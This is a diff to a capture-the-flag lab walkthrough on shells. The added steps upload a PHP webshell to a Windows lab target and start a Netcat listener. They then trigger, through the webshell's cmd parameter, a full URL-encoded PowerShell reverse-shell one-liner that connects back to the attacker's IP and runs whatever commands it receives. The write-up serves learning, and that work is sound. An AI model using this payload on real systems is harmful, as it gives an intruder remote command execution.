@@ -742,7 +742,7 @@ The remainder of this task will consist of shell examples for you to try out on 
 
 	* Upload file `php-reverse-shell`
 
-		![task13-win-upload](./images/task13-win-upload.png)
+		![task13-win-upload-rshell](./images/task13-win-upload-rshell.png)
 
 	* Set Netcat listener on our machine
 
@@ -757,6 +757,22 @@ The remainder of this task will consist of shell examples for you to try out on 
 		![task13-win-fail](./images/task13-win-fail.png)
 
 * Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.
+
+	* Creat file webshell 
+
+		![task13-webshell](./images/task13-webshell.png)
+
+	* Upload file to target machine via browser
+
+		![task13-win-upload-shell](./images/task13-win-upload-shell.png)
+
+	* Set Netcat listener on our machine
+
+		![task13-win-listener](./images/task13-win-listener.png)
+
+	* Excecute webshell on target machine via browser `http://10.10.125.216/uploads/shell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.13.52.88%27%2C9999%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`
+
+		![task13-win-get-shell.png](./images/task13-win-get-shell.png)
 
 * The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.
 
